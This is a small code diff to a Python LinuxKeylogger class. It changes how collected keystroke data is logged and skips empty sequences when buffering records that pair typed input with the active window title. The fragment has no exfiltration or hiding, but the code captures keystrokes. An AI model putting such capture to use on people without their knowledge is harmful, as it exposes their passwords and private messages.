@@ -144,19 +144,20 @@ class LinuxKeylogger:
         with self._lock:
             data = self.buffer.copy()
             self.buffer.clear()
-            logger.debug("Data collected: %s", data)
+            logger.debug("Data collected: %s", [d.format_as_dict() for d in data])
             return data
 
     def start_new_sequence(self, active_window: str = ""):
         with self._lock:
-            self.buffer.append(
-                DataWrapper(
-                    self.sequence,
-                    end_time=datetime.now(),
-                    start_time=self.sequence_start_time,
-                    active_window=self.active_window,
+            if self.sequence:
+                self.buffer.append(
+                    DataWrapper(
+                        self.sequence,
+                        end_time=datetime.now(),
+                        start_time=self.sequence_start_time,
+                        active_window=self.active_window,
+                    )
                 )
-            )
             self.active_window = active_window
             self.sequence = []
             self.sequence_start_time = None
